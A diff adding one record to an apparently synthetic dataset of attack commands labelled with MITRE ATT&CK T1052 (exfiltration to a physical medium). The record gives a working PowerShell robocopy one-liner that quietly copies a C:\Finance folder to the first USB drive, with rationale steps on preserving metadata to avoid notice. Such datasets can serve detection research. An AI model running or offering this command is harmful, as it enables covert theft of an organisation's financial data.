@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1052",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$dl=(Get-Volume | Where-Object {$_.DriveType -eq 'Removable'} | Select-Object -First 1 -ExpandProperty DriveLetter); robocopy \"C:\\Finance\" \"$dl:\\Receipts\" /E /Z /R:1 /W:1 /COPY:DAT /DCOPY:T /XJ /NFL /NDL /NP",
+  "explanation": "Uses robocopy to mirror financial data to a removable drive, preserving timestamps and attributes to blend in.",
+  "rationale_steps": [
+    "Resolve the first removable drive letter.",
+    "Use robocopy with resilient and quiet options to copy the directory tree to the USB.",
+    "Preserve file metadata to reduce anomalies."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1052-5d877001-fa0fd7bc",
+  "source_prompt_hash": "5d877001",
+  "timestamp_utc": "2025-09-30T05:25:30.107478Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
